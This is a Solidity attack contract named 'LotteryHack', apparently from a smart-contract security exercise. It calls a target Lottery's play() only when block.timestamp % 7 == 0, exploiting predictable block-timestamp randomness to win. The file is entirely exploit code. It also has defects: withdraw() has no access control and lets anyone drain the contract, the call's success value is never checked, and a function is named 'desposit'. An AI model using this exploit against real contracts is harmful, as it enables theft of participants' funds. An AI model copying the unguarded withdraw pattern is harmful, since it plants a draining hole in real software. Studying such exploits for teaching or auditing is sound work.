// SPDX-License-Identifier: MIT

pragma solidity ^0.8.13;

import { Lottery } from "src/Lottery.sol";

contract LotteryHack{
    Lottery lottery;

    constructor(address _lottery) {
        lottery = Lottery(_lottery);
    }
    function desposit() public payable {
        
    }
    function withdraw(uint256 _amount) public {
        (bool success,) = payable(msg.sender).call{value: _amount}("");
    }   
    function playhack() public returns (bool) {
        require(block.timestamp % 7 == 0);
        bool result = lottery.play{value: 0.1 ether}();
        return result;
    }
    receive() external payable {}
}
